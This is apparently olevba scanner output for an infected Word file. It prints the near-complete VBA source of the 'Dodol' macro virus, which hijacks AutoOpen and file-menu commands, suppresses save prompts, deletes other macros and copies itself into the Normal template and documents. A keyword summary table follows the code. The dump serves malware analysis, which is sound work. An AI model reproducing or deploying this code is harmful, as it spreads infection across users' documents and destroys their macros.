olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CyberHack-based-7e0723014838df5a80f9517a8b24aa4f31c82060
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CyberHack-based-7e0723014838df5a80f9517a8b24aa4f31c82060 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Dodol.bas 
in file: Virus.MSWord.CyberHack-based-7e0723014838df5a80f9517a8b24aa4f31c82060 - OLE stream: 'Macros/VBA/Dodol'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Dibuat oleh Dodol
'Palembang, Februari 1999

Public uAsli
Public uSave
Public NorU
Public DokU
Sub uInit()
    uAsli = Application.DisplayAlerts
    Application.DisplayAlerts = wdAlertsNone
    uHold
    WordBasic.DisableAutoMacros 0
End Sub
Sub uClose()
Application.DisplayAlerts = uAsli
End Sub
Sub u2Nor()
    uHold
    On Error GoTo Erw1
    NorU = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Erh1a
    For i = 1 To NT.VBProject.VBComponents.Count
      nmacr = NT.VBProject.VBComponents(i).Name
      If nmacr = "Dodol" Then NorU = True
      If (nmacr <> "Dodol") And (nmacr <> "DodolForm") And (nmacr <> "ThisDocument") Then
        Application.OrganizerDelete Source:=NT.FullName, _
            Name:=nmacr, Object:=wdOrganizerObjectProjectItems
      nmacr.CodeModule.DeleteLines 1, nmacr.CodeModule.CountOfLines
      End If
      
    Next i
Erh1a:
    If NorU = False Then
      On Error GoTo Erh1
      Application.OrganizerCopy Source:=AD.FullName, _
          Destination:=NT.FullName, Name:= _
          "Dodol", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=AD.FullName, _
          Destination:=NT.FullName, Name:= _
          "DodolForm", Object:=wdOrganizerObjectProjectItems
      Templates(NT.FullName).Save
Erh1:
If Err.Number = 50289 Then MsgBox "Dak perlu khawatir ..." & Chr(13) & "Word kau sudah terproteksi dengan Aman", vbInformation, "Dodol !"
    End If
Erw1:
End Sub
Sub Nor2u()
    On Error GoTo Erw2
    uSave = 0
    DokU = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Erh2a
    For i = 1 To AD.VBProject.VBComponents.Count
      nmacr = AD.VBProject.VBComponents(i).Name
      If nmacr = "Dodol" Then DokU = True
      nmacr = NT.VBProject.VBComponents(i).Name
      If nmacr = "Dodol" Then DokU = True
      If (nmacr <> "Dodol") And (nmacr <> "DodolForm") And _
        (nmacr <> "ThisDocument") And (nmacr <> "Reference to Normal") Then
        Application.OrganizerDelete Source:=AD.FullName, _
          Name:=nmacr, Object:=wdOrganizerObjectProjectItems
      nmacr.CodeModule.DeleteLines 1, nmacr.CodeModule.CountOfLines
      End If
    Next i
Erh2a:
    If DokU = False Then
     On Error GoTo Erh2
     Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=AD.FullName, Name:= _
          "Dodol", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=AD.FullName, Name:= _
          "DodolForm", Object:=wdOrganizerObjectProjectItems
     uSave = 1
Erh2:
If Err.Number = 50289 Then MsgBox "Dak perlu khawatir ..." & Chr(13) & "Word kau sudah terproteksi dengan Aman", vbInformation, "Dodol !"
    End If
Erw2:
End Sub
Sub Unik()
    uInit
    u2Nor
    uClose
End Sub
Sub uHold()
    With Options
        .VirusProtection = True
        .SaveNormalPrompt = False
    End With
End Sub
Sub Simpan()
    On Error GoTo Erh4
Set AD = ActiveDocument
    If uSave = 1 Then
       AD.SaveAs FileName:=AD.Name, FileFormat:=wdFormatDocument
    End If
Erh4:
End Sub
Sub AutoOpen()
    Unik
    If Now > DateSerial(1999, 1, 1) Then Application.OnTime when:=Now + TimeValue("00:05:00"), Name:="uAksi"
    End
End Sub
Sub FileClose()
On Error GoTo Lewat1
    uInit
    u2Nor
    Nor2u
    uClose
    uHold
    WordBasic.FileClose
Lewat1:
End Sub
Sub FileOpen()
    Unik
    Dialogs(wdDialogFileOpen).Show
    uInit
    Nor2u
    Simpan
    uClose
    If Now > DateSerial(1999, 1, 1) Then Application.OnTime when:=Now + TimeValue("00:05:00"), Name:="uAksi"
    End
End Sub
Sub FileSaveAs()
    uInit
    u2Nor
    Nor2u
    uClose
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileSave()
    uInit
    u2Nor
    Nor2u
    uClose
    On Error GoTo Errh1
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    If Now > DateSerial(1999, 1, 1) Then Application.OnTime when:=Now + TimeValue("00:05:00"), Name:="uAksi"
    End
Errh1:
End Sub
Sub FileExit()
    uInit
    u2Nor
    Nor2u
    uClose
    uHold
    WordBasic.FileExit
End Sub
Sub ToolsOptions()
    Unik
End Sub
Sub FileNew()
    Unik
    Dialogs(wdDialogFileNew).Show
End Sub
Sub FileTemplates()
    Unik
End Sub
Sub ToolsMacro()
    Unik
End Sub
Sub ToolsCustomize()
    Unik
End Sub
Sub ToolsCustomizeKeyboard()
    Unik
End Sub
Sub ViewVBCode()
    Unik
End Sub
Sub Organizer()
End Sub
Sub FormatStyle()
    Unik
End Sub
Sub uAksi()
On Error GoTo gagal1
DodolForm.Show
gagal1:
End Sub
Sub HelpAbout()
On Error GoTo gagal2
Text1 = "Macro ini dibuat oleh Dodol"
Text2 = "Palembang (Bukit Besar), Februari 1999"
text3 = "Buat DIAST :"
Text4 = "Thanks untuk pinjaman komputernya !"
Set bln = Assistant.NewBalloon
With bln
    .Heading = "Dodol Show Time !"
    .Text = Text1 & Chr(13) & Text2 & Chr(13) & Chr(13) & text3 & Chr(13) & Text4
    .Show
End With
gagal2:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

